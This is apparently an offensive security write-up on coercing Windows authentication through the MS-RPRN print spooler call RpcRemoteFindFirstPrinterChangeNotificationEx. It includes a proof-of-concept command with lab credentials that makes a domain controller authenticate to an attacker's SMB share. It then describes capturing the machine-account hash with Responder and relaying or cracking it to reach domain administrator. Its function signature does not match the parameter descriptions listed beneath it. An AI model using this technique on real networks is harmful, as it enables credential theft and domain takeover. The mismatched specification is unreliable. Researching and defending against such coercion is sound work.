# MS-RPRN - Remote call to RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)

## Summary

 - **Protocol**: [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)

 - **Protocol UUID**: 12345678-1234-abcd-ef00-0123456789ab

 - **Protocol version**: 1.0

 - **Function name**: [`RpcRemoteFindFirstPrinterChangeNotificationEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)

 - **Function operation number**: `65`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine.

Then we need to connect to the remote SMB pipe `\PIPE\spoolss` and bind to (uuid `12345678-1234-abcd-ef00-0123456789ab`, version `1.0`) in order to perform calls to RPC functions of the `MS-RPRN` protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\spoolss`. This pipe is connected to the protocol [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and allows to call RPC functions of this protocol. It will then call the remote [`RpcRemoteFindFirstPrinterChangeNotificationEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d) function on the Windows Server (192.168.2.1) with the following parameters:

```cpp
RpcRemoteFindFirstPrinterChangeNotificationEx(...)
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\NETLOGON` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to ohter services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

---

## Function technical detail

```cpp
DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
    [in, string, unique] STRING_HANDLE pPrinterName,
    [out] PRINTER_HANDLE* pHandle,
    [in, string, unique] wchar_t* pDatatype,
    [in] DEVMODE_CONTAINER* pDevModeContainer,
    [in] DWORD AccessRequired
);
```


 - **hPrinter**: A handle to a printer or server object that was opened by RpcAddPrinter (section 3.1.4.2.3), RpcAddPrinterEx (section 3.1.4.2.15), RpcOpenPrinter (section 3.1.4.2.2), or RpcOpenPrinterEx (section 3.1.4.2.14).


 - **fdwFlags**: Flags that specify the conditions that are required for a change notification object to enter a signaled state. A change notification MUST occur when one or more of the specified conditions are met.

    This parameter specifies a bitwise OR of zero or more Printer Change Values (section 2.2.4.13). The rules governing printer change values are specified in section 2.2.4.13.


 - **fdwOptions**: The category of printers for which change notifications are returned. This parameter MUST be one of the supported values specified in Printer Notification Values (section 2.2.3.8).


 - **pszLocalMachine**: A pointer to a string that represents the name of the client computer. The rules governing server names are specified in section 2.2.4.16.


 - **dwPrinterLocal**: An implementation-specific unique value that MUST be sufficient for the client to determine whether a call to RpcReplyOpenPrinter (section 3.2.4.1.1) by the server is associated with the hPrinter parameter in this call.<369>


 - **pOptions**: A pointer to an RPC_V2_NOTIFY_OPTIONS (section 2.2.1.13.1) structure that specifies printer or job members that the client listens to for notifications. For lists of members that can be monitored, see Printer Notification Values (section 2.2.3.8) and Job Notification Values (section 2.2.3.3).

    The value of this parameter can be NULL if the value of fdwFlags is nonzero.


## References

 - Documentation of protocol [MS-RPRN]: Print System Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1


 - Documentation of function `RpcRemoteFindFirstPrinterChangeNotificationEx`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d